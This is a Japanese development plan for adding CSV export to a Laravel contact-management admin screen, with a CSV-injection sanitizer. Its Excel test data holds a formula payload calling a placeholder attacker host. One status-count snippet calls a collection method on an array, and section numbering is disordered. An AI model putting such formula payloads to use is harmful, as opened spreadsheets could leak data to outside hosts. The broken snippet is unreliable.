# CSV エクスポート機能の追加

## Context

管理画面のお問い合わせ一覧には、キーワード・ステータス・日付範囲による絞り込みとソート機能が既にあるが、絞り込んだ結果を外部（Excel等）に持ち出して集計・共有する手段がない。管理者が「対応中のお問い合わせ一覧を Excel に落として上長に共有する」「特定期間の問い合わせを集計する」といった業務を行えるよう、現在の絞り込み・ソート条件に一致するお問い合わせを CSV ファイルとしてダウンロードできる機能を追加する。

既存の絞り込みロジック（`ContactController::normalizeFilters()` と `Contact::scopeFilter()`）をそのまま再利用し、新規ライブラリを導入せず Laravel 標準機能のみで実装する。

## 実装開始前の基準点

`CLAUDE.md` の「変更前に必ずgit commit」に従い、本計画書のレビュー修正を commit し、作業ツリーが clean であることを確認してから実装を開始する。本機能の Red テスト追加が「変更開始」となるため、それより前に基準点となる commit を作成する。

## 採用方針（検討事項への回答）

- **CSV 生成方式**: `league/csv` 等は導入せず、`response()->streamDownload()` + `fputcsv()` の標準実装とする。CSV 方言はカンマ区切り、ダブルクォート囲み、独自エスケープ無効（`escape: ''`）、CRLF 行末（`eol: "\r\n"`）に固定する。PHP の既定バックスラッシュエスケープは RFC 4180 互換ではなく、PHP 8.4 以降で既定値への依存が非推奨のため使用しない。
- **文字エンコーディング**: UTF-8 with BOM を採用（絵文字を含む本文データがあり、Shift_JIS では文字欠落が起きるため）。
- **取得整合性とメモリ**: 一意な第2ソート `id` を加えた単一 SQL クエリを `cursor()` でストリームする。`lazy(500)` は OFFSET/LIMIT の複数クエリであり、公開フォームからの新規登録や管理者のステータス更新がチャンク境界を移動させ、行の欠落・重複を起こし得るため採用しない。単一ステートメントの結果セットをエクスポート対象のスナップショットと定義する。PDO ドライバが結果を内部バッファする可能性はあるため、想定上限10,000件でメモリを実測して許容可否を判定する。読み取りカーソルが長時間化するトレードオフは、タイムアウト検証を受入条件にすることで管理する。メモリまたは処理時間の受入基準を満たせない場合は同期エクスポートを出荷せず、非同期ジョブによるファイル生成か、プロダクト要件として明示する件数上限を再設計する。
- **並び順の一元化**: `index()`、`show()` の前後ナビゲーション、`export()` が同じ private クエリビルダーを使う。選択ソート列・方向の後に `id` を同方向で追加し、一覧、詳細、CSV の同値行順序まで一致させる。
- **CSV インジェクション対策**: CSV は Excel で開き、保存・再オープン・共有される前提とする。公開フォーム由来の値（名前、メールアドレス、件名、本文）の先頭が `=` `+` `-` `@` `\t` `\r` `\n` または日本語環境で式と解釈される可能性のある全角文字 `＝` `＋` `－` `＠` で始まる場合、先頭にタブを付与する。タブを含む値は `fputcsv()` によりダブルクォートで囲まれる。タブが基礎データに残るトレードオフは、Excel での人間による閲覧と安全性を優先して受け入れる。先頭アポストロフ方式は、Excel で保存・再オープンした際の安全性を保証できないため採用しない。
- **エクスポート対象**: 現在の絞り込み・ソート条件に一致する**全件**（`per_page`/`page` は無視）。
- **フィルター引き継ぎ**: エクスポート URL は生の `request()` 値ではなく、`normalizeFilters()` で正規化済みの `$filters` から生成する。これにより、既存互換入力の `statuses` も `status` に正規化して引き継ぎ、一覧より広い範囲を誤って出力しない。
- **CSV 項目**: ID, 名前, メールアドレス, 件名, 本文, ステータス（日本語ラベル）, 登録日時（`formatted_created_at` と同じ表示形式）。
- **Microsoft Excel 互換性（必須要件）**: ダウンロードした CSV を Microsoft Excel でダブルクリックしてそのまま開いた際に日本語・絵文字が文字化けしないこと。UTF-8 BOM 付与により、Windows/Mac 双方の現行 Excel（2016以降）が自動的に UTF-8 と認識して正しく表示するため、追加のインポート手順（データタブ→テキストまたはCSVから、での文字コード指定）は不要とする。検証方法の項で実機 Excel での確認を必須ステップとする。

## 実装方針: TDD（テスト駆動開発）

本機能はテスト駆動開発（Red → Green → Refactor）で実装する。以下の順序で「失敗するテストを書く → 最小実装で通す → リファクタ」を繰り返す（各テスト名は下記「5. テスト追加」の一覧に対応）:

1. `test_unauthenticated_user_cannot_export_csv` を書き実行（ルート未定義のため失敗）→ ルート追加（実装ステップ1）→ Green化
2. `test_authenticated_non_admin_user_cannot_export_csv` を書き実行 → Green化（ミドルウェアで担保、追加実装は不要な想定）
3. `test_admin_can_export_csv`（ステータス200・ヘッダー検証）を書き実行 → `export()` の骨組み（空CSV返却）を実装 → Green化
4. `test_export_csv_filename_includes_timestamp` → ファイル名生成ロジックを実装
5. `test_export_csv_starts_with_utf8_bom_and_header_row` → BOM書き込み・ヘッダー行 `fputcsv` を実装
6. `test_export_csv_contains_contact_data_row` → データ行の `fputcsv`（`sanitizeCsvField` 呼び出し含む）を実装
7. `test_export_csv_preserves_rfc4180_special_characters` → `fputcsv()` の delimiter / enclosure / escape / EOL を明示し、カンマ、ダブルクォート、CRLF/LF、バックスラッシュ、絵文字をラウンドトリップで確認
8. `test_export_csv_respects_status_filter` / `test_export_csv_respects_statuses_alias` 〜 `test_export_csv_respects_date_range_filter` → `normalizeFilters()`/`Contact::scopeFilter()` への接続を実装（既存ロジック再利用のため多くは自然にGreenになる想定）
9. `test_export_csv_respects_sort_order`、`test_export_csv_outputs_each_contact_once_when_sort_values_tie`、`test_index_show_and_export_share_tie_breaker_order` → 選択ソート＋ `id` の一意な並び順を共通クエリビルダーに実装
10. `test_export_csv_ignores_pagination_and_exports_all_matching_rows` と `test_export_csv_executes_single_contact_select_query` → `cursor()` の単一クエリで、ページネーションと無関係に全件出力する実装を確認
11. `test_export_csv_returns_header_only_when_no_contacts_match` → 0件時の挙動を確認
12. `test_export_csv_sanitizes_all_dangerous_prefixes` → ASCII、制御文字、全角文字を含む `sanitizeCsvField()` を実装
13. `test_export_csv_header_labels_localized_in_english` → `en.json` に英訳、`ja.json` に identity mapping を追加
14. `test_index_csv_export_link_uses_normalized_filters` と `test_ajax_index_csv_export_link_uses_normalized_filters` を書き実行 → 正規化済みフィルターからエクスポート URL を生成し、ビューに CSV エクスポートボタンを追加
15. 上記が全てGreenになった時点でリファクタリング（重複排除・可読性）を行い、`vendor/bin/pint` で整形
16. `composer dev` 上で実機 Excel、320px viewport、関連スクリーンショット/GIF を含む手動検証を行う

## 実装ステップ

### 1. ルート追加 — `routes/web.php`

`Route::resource('contacts', ...)` の `{contact}` ワイルドカードと衝突しないよう、resource 定義の**直前**に固定パスルートを追加する:

```php
Route::middleware(['auth', 'can:manage-contacts'])->prefix('admin')->name('admin.')->group(function () {
    Route::get('contacts/export', [AdminContactController::class, 'export'])->name('contacts.export');
    Route::resource('contacts', AdminContactController::class)->only(['index', 'show', 'update']);
});
```

同一ミドルウェアグループ内のため `auth` + `can:manage-contacts` ゲートが自動適用される。

**ルート定義の順序について**:
Laravel は登録順に評価するため、固定パス（`contacts/export`）が可変パス（`{id}`）より先に宣言される必要があります。先に `contacts/export` を定義しないと、`/contacts/{id}` の `{id} = export` として誤解釈される可能性があります。

### 2. コントローラーメソッド追加 — `app/Http/Controllers/Admin/ContactController.php`

`update()`（147〜176行目）の直後、`normalizeFilters()`（178行目）の直前に `export()` を追加する。また、`Contact::scopeFilter()` と並び順の適用を `filteredContactsQuery()` に集約し、`index()`、`show()`、`export()` の3か所から再利用する。選択列が同値の行に対して `id` を同方向の第2ソートにし、順序を一意にする。

#### `filteredContactsQuery()` の実装

```php
/**
 * 正規化済み条件に絞り込みと一意な並び順を適用する。
 *
 * @param  array{status: array<string>, keyword: string, body_keyword: string, date_from: ?Carbon, date_to: ?Carbon, date_from_display: string, date_to_display: string, sort: string, per_page: int}  $filters
 */
private function filteredContactsQuery(array $filters): Builder
{
    [$sortColumn, $sortDirection] = self::SORT_OPTIONS[$filters['sort']];

    return Contact::query()
        ->filter($filters)
        ->orderBy($sortColumn, $sortDirection)
        ->orderBy('id', $sortDirection);
}
```

このメソッドは `index()`、`show()`、`export()` の3か所で利用されます：

- **`index()`**: `paginate()` 前のクエリ組み立て
- **`show()`**: 前後ナビゲーション用の ID リスト取得（`pluck('id')`）
- **`export()`**: CSV 出力用の全件カーソル反復

**ステータス別件数バッジ集計への対応**:
ステータス別の件数集計には並び順が不要なため、この `filteredContactsQuery()` は使用しません。代わり以下のように独立した集計クエリを実装してください：

```php
private function getStatusCounts(array $filters): array
{
    return Status::cases()
        ->mapWithKeys(fn ($status) => [
            $status->value => Contact::query()
                ->filter(array_merge($filters, ['status' => [$status->value]]))
                ->count(),
        ])
        ->toArray();
}
```

#### `export()` メソッドの実装

```php
public function export(Request $request): StreamedResponse
{
    $filters = $this->normalizeFilters($request);
    $contacts = $this->filteredContactsQuery($filters)->cursor();

    $filename = 'contacts_'.now()
        ->setTimezone(config('app.display_timezone', 'Asia/Tokyo'))
        ->format('Ymd_His').'.csv';

    return response()->streamDownload(function () use ($contacts) {
        $handle = fopen('php://output', 'wb');
        fwrite($handle, "\xEF\xBB\xBF"); // Excel文字化け防止のUTF-8 BOM

        fputcsv(
            $handle,
            [__('ID'), __('名前'), __('メールアドレス'), __('件名'), __('本文'), __('ステータス'), __('登録日時')],
            separator: ',',
            enclosure: '"',
            escape: '',
            eol: "\r\n",
        );

        foreach ($contacts as $contact) {
            fputcsv(
                $handle,
                [
                    $contact->id,
                    $this->sanitizeCsvField($contact->name),
                    $this->sanitizeCsvField($contact->email),
                    $this->sanitizeCsvField($contact->subject),
                    $this->sanitizeCsvField($contact->body),
                    $contact->status->label(),
                    $contact->formatted_created_at,
                ],
                separator: ',',
                enclosure: '"',
                escape: '',
                eol: "\r\n",
            );
        }

        fclose($handle);
    }, $filename, ['Content-Type' => 'text/csv; charset=UTF-8']);
}
```

#### `index()` メソッドでの `$exportQuery` 生成

`index()` では以下のように正規化済みの `$exportQuery` を生成し、通常ビューと Ajax パーシャルの両方に渡します：

```php
public function index(Request $request): View|Response
{
    $filters = $this->normalizeFilters($request);
    
    // ... 通常の絞り込み・ページネーション処理 ...
    
    // CSV エクスポート用フィルター（正規化済み）
    $exportQuery = array_filter([
        'status' => $filters['status'],
        'keyword' => $filters['keyword'],
        'body_keyword' => $filters['body_keyword'],
        'date_from' => $filters['date_from_display'],
        'date_to' => $filters['date_to_display'],
        'sort' => $filters['sort'],
    ], fn (mixed $value): bool => $value !== '' && $value !== []);

    // Ajax リクエストの場合はパーシャルのみを返す
    if ($request->ajax()) {
        return response()->view('admin.contacts._list', [
            'contacts' => $contacts,
            'exportQuery' => $exportQuery,
            'statusCounts' => $this->getStatusCounts($filters),
            // ... その他のビュー変数 ...
        ]);
    }

    // 通常リクエストはフルビューを返す
    return view('admin.contacts.index', [
        'contacts' => $contacts,
        'exportQuery' => $exportQuery,
        'statusCounts' => $this->getStatusCounts($filters),
        // ... その他のビュー変数 ...
    ]);
}
```

このパターンにより、`normalizeFilters()` で正規化済みの `$filters` から `$exportQuery` を生成するため、元リクエストが `statuses=in_progress` でも、エクスポート URL は `status[]=in_progress` 相当となり、一覧と同じ範囲を出力します。



### 4. コントローラーメソッド追加 — `app/Http/Controllers/Admin/ContactController.php`

#### CSV インジェクション対策の実装

クラス末尾（`normalizeDate()` の後）に CSV インジェクション対策の private ヘルパーを追加します：

```php
private function sanitizeCsvField(string $value): string
{
    $dangerousPrefixes = ['=', '+', '-', '@', "\t", "\r", "\n", '＝', '＋', '－', '＠'];

    foreach ($dangerousPrefixes as $prefix) {
        if (str_starts_with($value, $prefix)) {
            return "\t".$value;
        }
    }

    return $value;
}
```

#### use ステートメント追加

クラスの use に以下を追加します：

```php
use Illuminate\Database\Eloquent\Builder;
use Symfony\Component\HttpFoundation\StreamedResponse;
```

**エラーハンドリング方針**: `update()` と異なり try/catch は追加しません。ストリーミングレスポンスはヘッダー送信後に例外が起きても通常のエラーレスポンスへ復帰できず、Laravel の `streamDownload()` が例外をラップして標準例外ハンドラへ渡します。例外を握りつぶさず、重複ログや送信済み応答への無効なフォールバックを追加しません。

### 5. ビュー変更 — `resources/views/admin/contacts/_list.blade.php`

1〜24行目の「全 :count 件」ヘッダー行（`@if ($contacts->count() > 0)` の**外側**にあるため0件時も表示される）に、CSV エクスポートリンクを追加する。コントローラーから渡された正規化済みの `$exportQuery` を使い、生の `request()->only(...)` は使用しない。`per_page`/`page` は `$exportQuery` に含まれないため、常にエクスポート対象外となる。

```blade
<a
    href="{{ route('admin.contacts.export', $exportQuery) }}"
    download
    aria-label="{{ __('CSVエクスポート') }}"
    class="min-h-11 inline-flex items-center gap-1.5 px-3 py-1.5 text-xs sm:text-sm font-semibold rounded-lg border border-brand-border bg-white dark:bg-stone-900 text-brand-text hover:border-brand-primary hover:text-brand-primary transition-colors shadow-sm"
>
    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v2a2 2 0 002 2h12a2 2 0 002-2v-2M7 10l5 5 5-5M12 15V3" />
    </svg>
    {{ __('CSVエクスポート') }}
</a>
```

JS（`resources/js/app.js`）は変更不要。`_list.blade.php` は Ajax 絞り込み後も毎回サーバー側で再レンダリングされ、そのリクエストを正規化した `$exportQuery` がパーシャルに渡る。通常表示と Ajax 再描画後の両方で href を Feature test する。

### 6. 翻訳ファイル追加 — `resources/lang/en.json`, `resources/lang/ja.json`

`CLAUDE.md` の「英語・日本語の多言語翻訳ファイルを完備」を明示的に満たすため、`en.json` に英訳、`ja.json` に identity mapping を追加する。Laravel は日本語原文キーのフォールバックでも同じ表示になるが、本機能では追加キーの対応関係を両ファイルに明記する。

`resources/lang/en.json`:

```json
{
  "CSVエクスポート": "Export CSV",
  "名前": "Name",
  "登録日時": "Registered At"
}
```

`resources/lang/ja.json`:

```json
{
  "CSVエクスポート": "CSVエクスポート",
  "名前": "名前",
  "登録日時": "登録日時"
}
```

（`メールアドレス`, `件名`, `本文`, `ステータス` は既存キーを流用。`ID` は言語非依存のため追加不要。）

既存の `test_<状況>_<期待結果>` 命名規則、`User::factory()->admin()->create()` 認可パターン、`app()->setLocale()` 多言語テストパターンを踏襲し、末尾に以下のケースを追加する。機能テストでは `streamedContent()` でボディを取得するが、これは応答全体をテストプロセスに保持するためメモリ性能の検証には使わない。CSV 行は BOM を取り除いた上で一時ストリームから `fgetcsv(..., escape: '')` で読み戻し、列数と値を検証する。

1. `test_unauthenticated_user_cannot_export_csv` — 未ログイン → `assertRedirectToRoute('login')`
2. `test_authenticated_non_admin_user_cannot_export_csv` — 非admin → `assertForbidden()`
3. `test_admin_can_export_csv` — 200、`Content-Type: text/csv; charset=UTF-8`、`Content-Disposition` に `attachment` を含む
4. `test_export_csv_filename_includes_timestamp` — ファイル名が `contacts_YYYYMMDD_HHmmss.csv` 形式
5. `test_export_csv_starts_with_utf8_bom_and_header_row` — 先頭が `"\xEF\xBB\xBF"`、続くヘッダー行が期待通り
6. `test_export_csv_contains_contact_data_row` — 既知データの各列が正しく出力される
7. `test_export_csv_preserves_rfc4180_special_characters` — カンマ、ダブルクォート、CRLF/LF、バックスラッシュ＋ダブルクォート、日本語、絵文字を含む各列が7列のまま正確に読み戻せる
8. `test_export_csv_respects_status_filter`
9. `test_export_csv_respects_statuses_alias` — `statuses=in_progress` でも対応中のみが出力される
10. `test_export_csv_respects_keyword_filter`
11. `test_export_csv_respects_body_keyword_filter`
12. `test_export_csv_respects_date_range_filter`
13. `test_export_csv_respects_sort_order`
14. `test_export_csv_outputs_each_contact_once_when_sort_values_tie` — 501件を同じ選択ソート値で作成し、CSV の ID が期待する `id` 順で、重複・欠落なく1回ずつ出力される
15. `test_index_show_and_export_share_tie_breaker_order` — 同じ第1ソート値のデータに対し、一覧順、詳細の前後 ID、CSV の ID 順が一致する
16. `test_export_csv_executes_single_contact_select_query` — 501件以上でもエクスポート本体の `contacts` SELECT が1回だけ実行され、OFFSET/LIMIT の分割取得に戻らない
17. `test_export_csv_ignores_pagination_and_exports_all_matching_rows` — `per_page`/`page` を指定しても全件出力されることを確認
18. `test_export_csv_returns_header_only_when_no_contacts_match` — 0件時はヘッダー行のみ
19. `test_export_csv_sanitizes_all_dangerous_prefixes` — `=`,`+`,`-`,`@`,`\t`,`\r`,`\n`,`＝`,`＋`,`－`,`＠` と通常値をデータプロバイダーで検証
20. `test_export_csv_sanitizes_each_user_controlled_field` — 名前、メールアドレス、件名、本文のそれぞれに対策が適用される
21. `test_export_csv_header_labels_localized_in_english` — 英語ロケールでヘッダーが英語になることを確認
22. `test_index_csv_export_link_uses_normalized_filters` — `statuses` を含むフルビューから、正規化後の `status`、keyword、body_keyword、date_from/date_to、sort を含み、page/per_page を含まない href が生成される
23. `test_ajax_index_csv_export_link_uses_normalized_filters` — XHR で再描画された `_list` にも同じ href が含まれる

## 6. テストデータ仕様

### CSV インジェクション対策ケース

以下の値をテストデータの各フィールドに配置し、テスト `test_export_csv_sanitizes_all_dangerous_prefixes` で検証します：

**危険プリフィックスの検証**:
- ASCII 危険文字（先頭から順に検査）：`=`, `+`, `-`, `@`, `\t`, `\r`, `\n`
- 全角対応文字：`＝`, `＋`, `－`, `＠`
- 対策：各プリフィックスで始まる値にはタブ(`\t`)を先頭に付与

**テストデータ例**:
```php
Contact::factory()->create([
    'name' => '=SUM(1+2)',  // 危険プリフィックス
    'email' => 'user@example.com',
    'subject' => 'Test',
    'body' => 'Normal text',
]);

Contact::factory()->create([
    'name' => '+1',  // 危険プリフィックス
    'email' => '+2@example.com',  // 危険プリフィックス
    'subject' => 'Test',
    'body' => 'Normal text',
]);

Contact::factory()->create([
    'name' => '＝式テスト',  // 全角危険文字
    'email' => '＋user@example.com',  // 全角危険文字
    'subject' => 'Test',
    'body' => '-command',  // 危険プリフィックス
]);
```

### RFC 4180 ラウンドトリップテストケース

テスト `test_export_csv_preserves_rfc4180_special_characters` で、以下の値を組み合わせたテストデータを検証します：

**必須テストフィールド**:
```php
Contact::factory()->create([
    'name' => '山田, 太郎 "営業部"',
    'email' => 'user+tag@example.com',
    'subject' => "Line 1\nLine 2\rLine 3\r\nLine 4",
    'body' => 'Quote: "Hello" and \\ backslash and emoji 😀 🎉',
]);
```

**検証内容**:
- カンマで囲まれることで7列を保持
- 内側のダブルクォートがエスケープ（`""` に変換）
- 改行（CRLF/LF/CR）が保持
- バックスラッシュが正確に読み戻される
- 日本語・絵文字が文字化けなく出力される

### Excel 互換性検証用テストデータ

`composer dev` での手動検証に使用するテストデータ：
```php
Contact::factory()->create([
    'name' => '＝IMPORTXML("http://attacker.com")',
    'email' => 'user@example.com',
    'subject' => 'CSV インジェクション',
    'body' => 'カンマ, ダブルクォート", 絵文字 🚀',
]);
```

このデータを含む CSV をダウンロードし、Windows/Mac の Microsoft Excel でダブルクリック展開後、数式が実行されず文字列で表示されることを確認してください。

## 対象ファイル一覧

- `routes/web.php`
- `app/Http/Controllers/Admin/ContactController.php`
- `resources/views/admin/contacts/_list.blade.php`
- `resources/lang/en.json`
- `resources/lang/ja.json`
- `tests/Feature/Admin/ContactControllerTest.php`
- `screenshots/admin_dashboard.jpg`
- `screenshots/demo_admin_dashboard.gif`
- `docs/csv_export_plan.md`（新規）

## 検証方法

1. `vendor/bin/pint` で整形し、`vendor/bin/pint --test` が PASS することを確認する。
2. `php artisan test --coverage` を実行し、全テスト PASS・カバレッジ 100.0% 維持を確認する。
3. 想定上限のスモークテストとして1,000件と10,000件（本文は上限の2,000文字）を用意し、各ケースを**別の新規 PHP サーバープロセス**で実行して HTTP ダウンロードをファイルへ保存する。`streamedContent()` は使用しない。一時的なローカル計測コードで、カーソル反復の直前に `gc_collect_cycles()` → `memory_reset_peak_usage()` の順で実行し、`memory_get_usage(true)` を開始値として記録する。処理後の `memory_get_peak_usage(true) - $startMemory` を当該リクエストの増分とし、10,000件でも32 MiB以内、かつタイムアウト・メモリ不足なしに完了することを確認する。基準を満たせない場合は同期エクスポートを出荷せず、非同期生成または明示的な件数上限へ設計を戻して、該当方式のテストと運用手順を計画し直す。計測用コードと計測データは commit しない。
4. `composer dev` で開発サーバーを起動し、管理者でログインして以下を確認する。
   - ステータス「対応中」と複数のキーワード/日付/ソート条件を適用し、CSV が一覧と同じ条件の行のみを含む。
   - `?statuses=in_progress` を付けて一覧を開いた場合も、エクスポートリンクは正規化後の「対応中」を引き継ぎ、他ステータスの行を含まない。
   - Ajax 絞り込み後もボタンが表示され、現在条件の href に更新される。
   - `page`/`per_page` の値に関わらず、条件に一致する全件が出力される。
   - 320px viewport でページ全体の横スクロールが発生せず、エクスポートボタンの操作領域が44px以上である。
5. 日本語、絵文字、カンマ、ダブルクォート、CRLF/LF、バックスラッシュ＋ダブルクォートを含む必須テストデータを作成する。ダウンロードした CSV を対象の Windows/Mac 版 Microsoft Excel でダブルクリックして開き、文字コード指定なしで文字化けや列ずれがないことを確認する。
6. `=`,`+`,`-`,`@`,`\t`,`\r`,`\n`,`＝`,`＋`,`－`,`＠` で始まる値を名前・メールアドレス・件名・本文に配置した必須テストデータを用意する。Excel で開いた時点で数式が実行されず文字列として表示されること、そのまま CSV 形式で保存・閉じる・再オープンしても数式が実行されないことを確認する。
7. `CLAUDE.md` の UI 変更ルールに従い、`screenshots/admin_dashboard.jpg` と `screenshots/demo_admin_dashboard.gif` を必ず再撮影・更新する。更新済みファイルを確認してから commit する。

## 参考資料

- [PHP Manual: `fputcsv`](https://www.php.net/fputcsv) — `escape` の明示指定、独自エスケープと RFC 4180 互換性
- [Laravel 13.x: Eloquent Cursors](https://laravel.com/docs/13.x/eloquent#cursors) — `cursor()` の PDO バッファによるメモリ制約と `lazy()`
- [OWASP: CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection) — Excel の数式インジェクション対策と保存・再オープン時の注意
